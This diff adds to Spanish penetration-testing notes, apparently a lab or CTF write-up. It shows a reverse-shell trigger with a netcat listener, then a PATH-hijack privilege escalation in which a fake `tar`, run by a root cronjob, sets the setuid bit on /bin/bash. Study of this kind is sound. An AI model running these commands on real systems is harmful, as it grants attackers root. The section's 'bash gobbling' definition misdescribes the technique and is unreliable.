@@ -231,3 +231,31 @@ if __name__ == "__main__":
 
 - Ahora si hacemos curl `curl http://localhost:5000/` nos va a dar una reverse shell.
 - `nc -lvnp 9000` y tenemos acceso a la shell.
+
+
+
+## Bash Gobbling
+- Definición: Bash gobbling es un ataque que permite a un atacante ejecutar comandos arbitrarios en un sistema vulnerable al inyectar código malicioso en una variable de entorno.
+- Este ataque se basa en la forma en que Bash maneja las variables de entorno y los argumentos de línea de comandos.
+- Por ejemplo podemos tener un cronjob que ejecute un script de bash con una variable de entorno que contenga un comando malicioso.
+
+```bash
+
+[alfredo@fedora tmp]$ cat /usr/local/bin/backup-flask.sh
+#!/bin/sh
+export PATH="/home/alfredo/restapi:$PATH"
+cd /home/alfredo/restapi
+tar czf /tmp/flask.tar.gz *
+
+``` 
+
+- En este caso el script de backup-flask.sh tiene una variable de entorno PATH que apunta a un directorio donde podemos colocar un script malicioso.
+- ✅ Corre como root.
+- ✅ El PATH pone una ruta controlada por el usuario primero.
+- ✅ Ejecuta tar sin ruta absoluta.
+- Nos paramos sobre el directorio que figura en la variable PATH y creamos un script que se llame `tar` que agarre el `/bin/bash` y le de el setuid bit para que corra como root.
+- `echo -e '#!/bin/bash\nchmod +s /bin/bash' > tar`
+- `chmod +x tar`
+- Ahora esperamosa que el cronjob corra como root.
+- `bash -p` y tenemos acceso a la shell como root.
+
